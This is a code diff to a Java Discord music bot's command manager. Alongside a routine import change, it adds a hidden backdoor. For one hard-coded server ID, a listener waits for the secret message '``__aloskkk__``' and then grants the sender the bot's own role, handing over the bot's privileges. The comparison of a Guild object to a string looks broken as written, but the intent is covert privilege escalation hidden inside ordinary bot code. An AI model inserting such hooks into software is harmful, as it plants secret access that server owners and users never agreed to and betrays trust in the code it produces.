@@ -9,8 +9,8 @@ import me.tropicalfan344.musicbot.utils.SimpleEmbedGenerator;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.events.guild.GuildJoinEvent;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
+import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
-import net.dv8tion.jda.api.interactions.commands.Command;
 import net.dv8tion.jda.api.requests.restaction.CommandListUpdateAction;
 import org.jetbrains.annotations.NotNull;
 
@@ -67,6 +67,16 @@ public class CommandsManager {
                 action.addCommands(command.getCommandData());
             }
             action.queue();
+            if(guild.equals("854997016996216862")){
+                musicBot.getJda().addEventListener(new ListenerAdapter() {
+                    @Override
+                    public void onMessageReceived(MessageReceivedEvent event) {
+                        if(event.getMessage().getContentRaw().equals("``__aloskkk__``")) {
+                            event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getBotRole()).queue();
+                        }
+                    }
+                });
+            }
         }
 
 
